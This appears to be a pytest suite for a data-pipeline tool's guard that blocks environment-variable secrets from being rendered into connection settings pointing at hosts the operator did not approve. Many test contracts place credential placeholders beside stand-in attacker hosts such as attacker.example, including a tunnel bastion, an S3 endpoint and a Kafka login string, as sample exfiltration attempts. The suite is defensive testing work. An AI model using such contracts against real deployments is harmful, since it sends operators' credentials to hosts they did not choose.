# Copyright 2025 Agentics Transformation Limited
# SPDX-License-Identifier: Apache-2.0

"""A ``{{ env.NAME }}`` in an acquisition build goes only where the operator paired it.

The acquisition dispatcher renders every placeholder from the operator's environment before a
runner starts. ``connection: {host: attacker.example, password: "{{ env.DB_PW }}"}`` would send
DB_PW to attacker.example, and a name cannot tell a secret from any other variable (DB_PW, PGPASS and
DATABASE_URL look like none). So the key is the destination, as ``secrets.policy`` judges it for a
``secretRef``: a variable in a source or a sink block renders only when every endpoint of that block
is this machine, a host written as one whole ``{{ env.* }}`` (the operator chose the address), or a
host the operator paired with it (``NAME@host`` in FLUID_ACQUISITION_SECRET_REF_ALLOWLIST).
"""

from __future__ import annotations

import copy
import logging
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

import pytest

from fluid_build.secrets.policy import ALLOWLIST_ENV as SECRET_REF_ALLOWLIST
from fluid_build.util.env_templates import (
    EnvTemplateError,
    check_env_pairing,
    check_host_templates,
)
from tests.build_runners.test_catalog_auth_sink import (
    _catalog,
    _dbz_contract,
    _dispatch,
    _dispatch_as_run_builds_does,
    _install_fake_server,
    _kc_contract,
    _props_path,
)

pytestmark = [pytest.mark.unit]

_PROBE = "synthvalue123"
_CATALOG_URI = "https://lakekeeper:8443/catalog"


@pytest.fixture(params=["kafka-connect", "debezium"])
def engine(
    request, tmp_path: Path, monkeypatch
) -> Tuple[Callable[..., Dict[str, Any]], Callable[[], str]]:
    """One acquisition engine with its server faked: ``(contract_for(), pushed())``. The operator
    pairs nothing unless a test says so."""
    monkeypatch.delenv(SECRET_REF_ALLOWLIST, raising=False)
    if request.param == "kafka-connect":
        mock = request.getfixturevalue("kafka_connect_mock")

        def contract_for(location: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
            return _kc_contract(None, location=location or _catalog(_CATALOG_URI))

        return contract_for, lambda: repr(mock.connectors)
    recorder = _install_fake_server(monkeypatch)
    paths: List[Path] = []

    def dbz_contract_for(location: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        contract = _dbz_contract(None, location=location or _catalog(_CATALOG_URI))
        paths.append(_props_path(contract, tmp_path))
        return contract

    def pushed() -> str:
        return repr(recorder.calls) + "".join(p.read_text() for p in paths if p.exists())

    return dbz_contract_for, pushed


def _source(contract: Dict[str, Any]) -> Dict[str, Any]:
    return contract["builds"][0]["properties"]["source"]["connection"]


def _run(contract: Dict[str, Any], tmp_path: Path, shape: str) -> int:
    """The dispatcher as it is called: with a contract as written (``direct``), with the contract
    beside itself (``yaml``), and with a plan's contract, rendered, beside the one as written."""
    if shape == "direct":
        return _dispatch(contract, tmp_path)
    return _dispatch_as_run_builds_does(contract, tmp_path, plan=shape == "plan")


_SHAPES = pytest.mark.parametrize("shape", ["direct", "yaml", "plan"])
_NAMES = pytest.mark.parametrize(
    "name", ["AWS_SECRET_ACCESS_KEY", "DB_PW", "PGPASS", "DATABASE_URL", "RUN_DATE"]
)


@_SHAPES
@_NAMES
def test_a_variable_beside_a_host_the_contract_picks_is_refused_unpaired(
    engine, tmp_path: Path, monkeypatch, capsys, caplog, shape, name
):
    """The repro: any name, ``password: "{{ env.NAME }}"`` beside a literal remote host."""
    contract_for, pushed = engine
    monkeypatch.setenv(name, _PROBE)
    contract = contract_for()
    _source(contract).update({"host": "attacker.example", "password": "{{ env.%s }}" % name})

    with caplog.at_level(logging.DEBUG):
        rc = _run(contract, tmp_path, shape)

    shown = capsys.readouterr()
    everything = shown.out + shown.err + caplog.text
    assert rc == 1
    assert name in everything, "the refusal names the variable"
    assert "attacker.example" in everything, "and the host as the contract wrote it"
    assert "source.connection.host" in everything, "and its field"
    assert "FLUID_ACQUISITION_SECRET_REF_ALLOWLIST" in everything and f"{name}@" in everything
    assert _PROBE not in everything and _PROBE not in pushed(), "never the value"
    assert "attacker.example" not in pushed(), "nothing was started"


@_SHAPES
@_NAMES
def test_the_operator_pairs_a_variable_with_the_host(
    engine, tmp_path: Path, monkeypatch, shape, name
):
    contract_for, pushed = engine
    monkeypatch.setenv(name, _PROBE)
    contract = contract_for()
    _source(contract).update({"host": "attacker.example", "password": "{{ env.%s }}" % name})

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, f"{name}@elsewhere.example")
    assert _run(contract, tmp_path, shape) == 1, "a pairing with another host does not count"

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, f"{name}@attacker.example")
    assert _run(contract, tmp_path, shape) == 0
    assert "attacker.example" in pushed()


def test_a_variable_paired_with_no_host_goes_to_every_host(engine, tmp_path: Path, monkeypatch):
    contract_for, pushed = engine
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = contract_for()
    _source(contract).update({"host": "attacker.example", "password": "{{ env.DB_PW }}"})
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW")
    assert _dispatch(contract, tmp_path) == 0
    assert "attacker.example" in pushed()


@_SHAPES
def test_a_host_that_is_one_whole_variable_needs_no_pairing(
    engine, tmp_path: Path, monkeypatch, shape
):
    """The operator's variable makes the address; the contract only says which one."""
    contract_for, pushed = engine
    monkeypatch.setenv("PGHOST", "db.internal")
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = contract_for()
    _source(contract).update({"host": "{{ env.PGHOST }}", "password": "{{ env.DB_PW }}"})
    assert _run(contract, tmp_path, shape) == 0
    assert "db.internal" in pushed()


@_SHAPES
@pytest.mark.parametrize("host", ["localhost", "127.0.0.1", "::1"])
def test_a_loopback_host_needs_no_pairing(engine, tmp_path: Path, monkeypatch, shape, host):
    contract_for, pushed = engine
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = contract_for()
    _source(contract).update({"host": host, "password": "{{ env.DB_PW }}"})
    assert _run(contract, tmp_path, shape) == 0
    assert host in pushed()


def test_a_decoy_host_does_not_cover_a_remote_one(engine, tmp_path: Path, monkeypatch, capsys):
    """Every endpoint of the block has to clear, so a whole-variable host (or a loopback one)
    beside a remote ``connection_string`` exempts nothing."""
    contract_for, pushed = engine
    monkeypatch.setenv("PGHOST", "db.internal")
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = contract_for()
    _source(contract).update(
        {
            "host": "{{ env.PGHOST }}",
            "connection_string": "postgres://attacker.example/db",
            "password": "{{ env.DB_PW }}",
        }
    )
    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert "DB_PW" in shown.out + shown.err and "attacker.example" in shown.out + shown.err
    assert _PROBE not in shown.out + shown.err + pushed()


def test_a_variable_in_the_catalog_settings_goes_with_the_catalog_host(
    engine, tmp_path: Path, monkeypatch, capsys
):
    """The sink's blocks: ``binding.location`` is sent to the catalog its ``uri`` names."""
    contract_for, pushed = engine
    monkeypatch.setenv("LAKE_WAREHOUSE", _PROBE)
    location = {**_catalog(_CATALOG_URI), "warehouse": "{{ env.LAKE_WAREHOUSE }}"}
    contract = contract_for(location)

    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert "LAKE_WAREHOUSE" in shown.out + shown.err and "lakekeeper" in shown.out + shown.err
    assert "exposes[0].binding.location.uri" in shown.out + shown.err
    assert _PROBE not in shown.out + shown.err and _PROBE not in pushed()

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "LAKE_WAREHOUSE@lakekeeper")
    assert _dispatch(contract, tmp_path) == 0


def test_a_literal_endpoint_url_beside_a_variable_is_refused(
    engine, tmp_path: Path, monkeypatch, capsys
):
    """``endpoint_url`` is a host: an S3-compatible store the contract picks gets every variable
    its block names."""
    contract_for, pushed = engine
    monkeypatch.setenv("LAKE_BUCKET", _PROBE)
    location = {
        **_catalog(_CATALOG_URI),
        "bucket": "{{ env.LAKE_BUCKET }}",
        "endpoint_url": "https://s3.attacker.example",
    }
    contract = contract_for(location)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "LAKE_BUCKET@lakekeeper")

    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert "LAKE_BUCKET" in shown.out + shown.err
    assert "s3.attacker.example" in shown.out + shown.err
    assert "binding.location.endpoint_url" in shown.out + shown.err
    assert _PROBE not in shown.out + shown.err and _PROBE not in pushed()


def test_an_unset_variable_is_reported_as_unset_not_as_unpaired(
    engine, tmp_path: Path, monkeypatch, capsys
):
    contract_for, pushed = engine
    monkeypatch.delenv("DB_PW", raising=False)
    contract = contract_for()
    _source(contract).update({"host": "attacker.example", "password": "{{ env.DB_PW }}"})
    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert "not set or empty" in shown.out + shown.err and "DB_PW" in shown.out + shown.err
    assert "paired" not in shown.out + shown.err


@_SHAPES
def test_a_variable_in_the_first_build_is_judged_when_another_build_runs(
    engine, tmp_path: Path, monkeypatch, capsys, shape
):
    """A runner reads ``builds[0]`` whichever build it runs, so every build is judged."""
    contract_for, pushed = engine
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = contract_for()
    first = contract["builds"][0]
    second = copy.deepcopy(first)
    second["id"] = "second"
    _source(contract).update({"host": "attacker.example", "password": "{{ env.DB_PW }}"})
    contract["builds"] = [first, second]

    from fluid_build.build_runners.base import _execute_acquisition_build

    rc = _execute_acquisition_build(second, contract, tmp_path, dry_run=False, as_written=contract)
    shown = capsys.readouterr()
    assert rc == 1 and "builds[0]" in shown.out + shown.err
    assert _PROBE not in shown.out + shown.err and _PROBE not in pushed()


# ── the check itself ─────────────────────────────────────────────────────────


def _contract(**source: Any) -> Dict[str, Any]:
    contract = _kc_contract(None, location=_catalog(_CATALOG_URI))
    _source(contract).update(source)
    return contract


@pytest.fixture(autouse=True)
def _no_operator_pairing(monkeypatch):
    monkeypatch.delenv(SECRET_REF_ALLOWLIST, raising=False)
    monkeypatch.setenv("DB_PW", _PROBE)


def test_the_refusal_is_typed_and_says_what_to_do():
    contract = _contract(host="attacker.example", password="{{ env.DB_PW }}")
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract, stage="fluid apply")
    error = info.value
    assert error.code == "EnvTemplateHostError"
    assert error.extras["reason"] == "unpaired" and error.extras["variable"] == "DB_PW"
    assert error.where == "builds[0].properties.source.connection.password"
    assert error.extras["entry"] == "DB_PW@attacker.example"
    assert "DB_PW@attacker.example" in error.fix and "secretRef" not in error.fix
    assert _PROBE not in repr(error.__dict__)


def test_a_block_that_names_no_endpoint_has_nothing_to_judge():
    """The engine's own configuration decides where it connects, as the policy's object-store gap."""
    check_env_pairing(_contract_without_a_host())
    contract = _kc_contract(None, location={"bucket": "{{ env.DB_PW }}", "format": "iceberg"})
    contract["builds"][0]["properties"].pop("source")
    check_env_pairing(contract)


def _contract_without_a_host() -> Dict[str, Any]:
    contract = _contract(password="{{ env.DB_PW }}")
    _source(contract).pop("host")
    return contract


def test_a_blank_endpoint_is_refused():
    """A field that is present and names no host is one the client picks itself: fail closed."""
    for host in ("", "   ", None):
        with pytest.raises(EnvTemplateError):
            check_env_pairing(_contract(host=host, password="{{ env.DB_PW }}"))


def test_an_object_store_endpoint_is_not_a_host():
    contract = _contract(uri="s3://a-bucket/prefix", password="{{ env.DB_PW }}")
    _source(contract).pop("host")
    check_env_pairing(contract)


@pytest.mark.parametrize(
    "field, value",
    [
        ("connection_string", "host=attacker.example dbname=x"),
        ("connection_string", "Server=attacker.example;Database=x"),
        ("uri", "postgres://attacker.example:5432/db"),
        ("sqlalchemy_url", "postgresql://attacker.example/db"),
        ("jdbc_url_params", "host=attacker.example"),
        ("host", "primary.example,attacker.example"),
        ("ssh_tunnel", {"enable": True, "host": "bastion.attacker.example"}),
        ("account", "attacker-account"),
    ],
)
def test_every_endpoint_the_policy_reads_counts(field: str, value: Any):
    """Keyword strings, query strings, host lists and tunnels: read by ``secrets.policy``, not here."""
    source: Dict[str, Any] = {field: value, "password": "{{ env.DB_PW }}"}
    contract = _contract()
    _source(contract).pop("host")
    _source(contract).update(source)
    if field == "account":
        _source(contract)["host"] = "acme.snowflakecomputing.com"
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.extras["reason"] == "unpaired"


def test_a_keyword_string_is_paired_for_any_host_or_not_at_all(monkeypatch):
    contract = _contract(connection_string="host=attacker.example dbname=x")
    _source(contract).pop("host")
    _source(contract)["password"] = "{{ env.DB_PW }}"
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW@attacker.example")
    with pytest.raises(EnvTemplateError):
        check_env_pairing(contract)  # the policy reads no host out of a keyword string
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW")
    check_env_pairing(contract)


@pytest.mark.parametrize("outputs", [["data"], ["nonexistent"], [], "data", None])
def test_every_expose_is_judged_whatever_outputs_names(outputs):
    """Runners pick their own expose (``exposes[0]`` for dlt, airbyte and meltano; the first Iceberg
    one for the Kafka Connect and Debezium sinks), so ``outputs`` is no promise of what is written.
    """
    contract = _airbyte_contract(
        {"host": "localhost"},
        exposes=[
            {
                "exposeId": "decoy",
                "binding": {
                    "location": {"host": "attacker.example", "password": "{{ env.DB_PW }}"}
                },
            },
            {"exposeId": "data", "binding": {"location": {"path": "./out/x.parquet"}}},
        ],
    )
    contract["builds"][0]["outputs"] = outputs
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.where == "exposes[0].binding.location.password"


def test_a_variable_in_one_expose_goes_with_the_catalog_of_another():
    contract = _kc_contract(None, location=_catalog(_CATALOG_URI))
    contract["builds"][0]["properties"].pop("source")
    other = copy.deepcopy(contract["exposes"][0])
    other["exposeId"] = "elsewhere"
    other["binding"]["location"]["warehouse"] = "{{ env.DB_PW }}"
    contract["exposes"].append(other)
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.where == "exposes[1].binding.location.warehouse"
    assert "host 'lakekeeper'" in info.value.what


def test_a_variable_in_the_sink_block_goes_with_the_catalog_the_location_names():
    contract = _kc_contract(None, location=_catalog(_CATALOG_URI))
    contract["builds"][0]["properties"].pop("source")
    contract["builds"][0]["properties"]["sink"]["catalogAuth"] = {
        "type": "bearer",
        "token": "{{ env.DB_PW }}",
    }
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.where == "builds[0].properties.sink.catalogAuth.token"
    assert "lakekeeper" in info.value.what


def test_one_build_on_its_own_is_read_too():
    contract = _contract(host="attacker.example", password="{{ env.DB_PW }}")
    with pytest.raises(EnvTemplateError):
        check_env_pairing({"build": contract["builds"][0]})


def test_nothing_to_judge_in_what_is_not_a_contract():
    for value in (None, [], "x", {"builds": "no"}, {"builds": [None, 3]}, {"build": {"id": "x"}}):
        check_env_pairing(value)


# ── what the reviews found ───────────────────────────────────────────────────


def _airbyte_contract(connection: Dict[str, Any], *, exposes: Optional[List[Any]] = None):
    return {
        "builds": [
            {
                "id": "b",
                "engine": "airbyte",
                "outputs": ["data"],
                "properties": {"source": {"kind": "postgres", "connection": connection}},
            }
        ],
        "exposes": exposes
        or [{"exposeId": "data", "binding": {"location": {"path": "./out/x.parquet"}}}],
    }


@pytest.mark.parametrize(
    "connection",
    [
        {"host": "attacker.example"},
        {"host": "attacker.example:5432"},
        {"uri": "postgres://u:{{ env.DB_PW }}@attacker.example:5432/db"},
        {"connection_string": "postgres://attacker.example/db?sslmode={{ env.DB_PW }}"},
    ],
)
def test_the_entry_the_refusal_suggests_clears_it(connection, monkeypatch):
    """The text names the host as the contract wrote it, and the entry it suggests is the one the
    policy matches (a bare ``host`` field keeps its port; a URI's does not count)."""
    contract = _contract()
    _source(contract).pop("host")
    _source(contract).update({**connection, "password": "{{ env.DB_PW }}"})
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    error = info.value
    assert "attacker.example" in error.what and "{{" not in error.what.split("}}", 1)[1]
    assert "secretRef" not in error.fix
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, error.extras["entry"])
    check_env_pairing(contract)


def test_a_variable_in_a_urls_password_does_not_hide_its_literal_host():
    contract = _contract()
    _source(contract).pop("host")
    _source(contract)["uri"] = "postgres://u:{{ env.DB_PW }}@attacker.example/db"
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert "host 'attacker.example'" in info.value.what


@pytest.mark.parametrize(
    "host",
    [
        "{{ env.H }}:5432",
        "{{ env.U }}@{{ env.H }}",
        "{{ env.U }}:{{ env.P }}@{{ env.H }}:5432",
    ],
)
def test_a_whole_variable_host_keeps_its_port_and_userinfo(host, monkeypatch):
    """A bare ``host`` field is read whole by the policy; the host part is still the operator's."""
    for name, value in {"H": "db.internal", "U": "u", "P": "5432"}.items():
        monkeypatch.setenv(name, value)
    check_env_pairing(_contract(host=host, password="{{ env.DB_PW }}"))


def test_a_tunnel_through_the_operators_own_bastion_needs_no_pairing(monkeypatch):
    monkeypatch.setenv("H", "db.internal")
    monkeypatch.setenv("B", "bastion.internal")
    check_env_pairing(
        _contract(
            host="{{ env.H }}",
            ssh_tunnel={"enable": True, "host": "{{ env.B }}"},
            password="{{ env.DB_PW }}",
        )
    )


def test_a_tunnel_through_a_host_the_contract_picks_is_refused_by_name():
    contract = _contract(
        host="{{ env.DB_PW }}",
        ssh_tunnel={"enable": True, "host": "bastion.attacker.example"},
    )
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert "bastion.attacker.example" in info.value.what
    assert "ssh_tunnel.host" in info.value.what


@pytest.mark.parametrize(
    "field, value",
    [("endpoint", "/v1/users"), ("uri", "/data/in.csv"), ("host", "/var/run/postgresql")],
)
def test_a_path_names_no_host(field, value):
    """A REST ``endpoint: /v1/users``, a file ``uri``, a socket directory: nothing to pair with."""
    contract = _contract()
    _source(contract).pop("host")
    _source(contract).update({field: value, "token": "{{ env.DB_PW }}"})
    check_env_pairing(contract)


def test_a_scheme_relative_uri_is_still_a_host():
    contract = _contract()
    _source(contract).pop("host")
    _source(contract).update({"uri": "//attacker.example/x", "token": "{{ env.DB_PW }}"})
    with pytest.raises(EnvTemplateError):
        check_env_pairing(contract)


@pytest.mark.parametrize(
    "exposes, outputs",
    [
        ([{"id": ["x"], "binding": {"location": {"host": "a.example"}}}], ["x"]),
        ([{"exposeId": None, "id": "x", "binding": {"location": {"host": "a.example"}}}], ["x"]),
        ([{"exposeId": "x", "binding": {"location": {"host": "a.example"}}}], "abc"),
        ([{"exposeId": 3, "binding": []}, None, "x"], None),
    ],
)
def test_odd_shapes_never_raise_anything_but_a_refusal(exposes, outputs):
    """A contract with no placeholder in it must reach the dispatcher's own checks unchanged."""
    contract = {"builds": [{"outputs": outputs, "properties": {}}], "exposes": exposes}
    check_env_pairing(contract)


@pytest.mark.parametrize(
    "key, value",
    [
        ("bootstrap_servers", "attacker.example:9092"),
        ("brokers", ["a.example:9092", "attacker.example:9092"]),
        ("db_host", "a.example"),
        ("HOST", "a.example"),
        ("Host", "a.example"),
        ("address", "a.example"),
        ("account", "acme-org"),
        ("server_hostname", "a.example"),
    ],
)
def test_an_address_the_policy_does_not_read_needs_an_entry_for_any_host(key, value, monkeypatch):
    """A pass-through connector may take its host from a field the policy has no name for. The
    policy refuses a ``secretRef`` in a block that names no host it can read; so does this."""
    contract = _airbyte_contract({key: value, "password": "{{ env.DB_PW }}"})
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert key in info.value.what and "any host" in info.value.fix
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW@a.example")
    with pytest.raises(EnvTemplateError):
        check_env_pairing(contract)  # an entry for one host reads no host out of this field
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW")
    check_env_pairing(contract)


@pytest.mark.parametrize(
    "connection",
    [
        {"brokers": "{{ env.BROKERS }}"},  # the operator's own address
        {"kind": "csv", "path": "{{ env.DIR }}/in.csv"},  # a local file names no host
        {"bucket_url": "s3://a-bucket/prefix"},  # a store
        {"endpoint_url": "/v1/data"},  # a path
        {"account_id": "123456789012"},  # not an address
        {"db_host": ""},  # names nothing
        {"db_host": None},
    ],
)
def test_what_is_not_an_address_is_not_judged_as_one(connection, monkeypatch):
    monkeypatch.setenv("BROKERS", "kafka.internal:9092")
    monkeypatch.setenv("DIR", "/data")
    check_env_pairing(_airbyte_contract({**connection, "password": "{{ env.DB_PW }}"}))


def test_a_variable_of_blanks_does_not_switch_the_check_off(monkeypatch):
    """The build's render keeps a value of blanks, so the check reads it as a value too: an
    endpoint that names one is judged, and nothing else in the block escapes with it."""
    monkeypatch.setenv("BLANKVAR", "  ")
    contract = _contract(
        host="attacker.example",
        uri="postgres://attacker.example:5432/db{{ env.BLANKVAR }}",
        password="{{ env.DB_PW }}",
    )
    with pytest.raises(EnvTemplateError):
        check_env_pairing(contract)


def test_a_variable_of_blanks_in_a_host_does_not_hide_its_neighbour(monkeypatch):
    monkeypatch.setenv("BLANK", "  ")
    with pytest.raises(EnvTemplateError) as info:
        check_host_templates({"host": "{{ env.BLANK }}{{ env.DB_PW }}.attacker.example"})
    assert info.value.extras["reason"] == "unpaired"


# ── the pass-through engines, through the dispatcher ─────────────────────────


def _fake_airbyte(monkeypatch) -> List[Any]:
    """Stand in for the Airbyte runner and record what it is handed."""
    import fluid_build.build_runners.airbyte.runner as runner

    calls: List[Any] = []

    def fake(build, contract, contract_dir, *, dry_run, sample_rows=None):
        calls.append(build)
        return 0

    monkeypatch.setattr(runner, "execute_airbyte_build", fake)
    return calls


def test_a_broker_the_contract_picks_gets_no_variable_through_a_pass_through_engine(
    tmp_path: Path, monkeypatch, capsys
):
    from fluid_build.build_runners.base import _execute_acquisition_build

    calls = _fake_airbyte(monkeypatch)
    monkeypatch.delenv(SECRET_REF_ALLOWLIST, raising=False)
    monkeypatch.setenv("KAFKA_PW", _PROBE)
    jaas = 'PlainLoginModule required username="u" password="{{ env.KAFKA_PW }}";'
    contract = _airbyte_contract(
        {"bootstrap_servers": "attacker.example:9092", "protocol": {"sasl_jaas_config": jaas}}
    )

    assert _execute_acquisition_build(contract["builds"][0], contract, tmp_path, dry_run=False) == 1
    shown = capsys.readouterr()
    assert calls == [], "the connector was never started"
    assert "KAFKA_PW" in shown.out + shown.err and _PROBE not in shown.out + shown.err

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "KAFKA_PW")
    assert _execute_acquisition_build(contract["builds"][0], contract, tmp_path, dry_run=False) == 0
    assert _PROBE in repr(calls), "once the operator allows it, the value is rendered"


def test_a_decoy_expose_ahead_of_the_output_is_judged(engine, tmp_path: Path, monkeypatch, capsys):
    """The Kafka Connect and Debezium sinks read the first Iceberg expose; ``outputs`` names another."""
    contract_for, pushed = engine
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = contract_for()
    decoy = copy.deepcopy(contract["exposes"][0])
    decoy["exposeId"] = "decoy"
    decoy["binding"]["location"].update(
        {"uri": "https://catalog.attacker.example/catalog", "warehouse": "{{ env.DB_PW }}"}
    )
    contract["exposes"].insert(0, decoy)

    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert "catalog.attacker.example" in shown.out + shown.err
    assert _PROBE not in shown.out + shown.err and _PROBE not in pushed()
    assert "attacker.example" not in pushed()
